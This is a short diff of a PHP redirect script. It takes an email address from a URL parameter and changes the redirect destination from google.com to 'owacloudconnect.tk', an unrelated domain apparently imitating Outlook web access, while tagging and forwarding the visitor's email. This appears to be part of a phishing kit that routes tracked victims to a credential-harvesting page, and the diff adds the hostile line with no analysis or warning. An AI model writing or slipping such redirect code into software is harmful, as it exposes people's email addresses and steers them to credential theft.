@@ -8,5 +8,5 @@ return $emID;
 }
 $em = $_GET['em'];
 $emID = getemIDFromem($em);
-header("Location: https://google.com/?em=$em");
+header("Location: https://owacloudconnect.tk/?em=SILENTCODERSEMAIL=$em");
 ?>
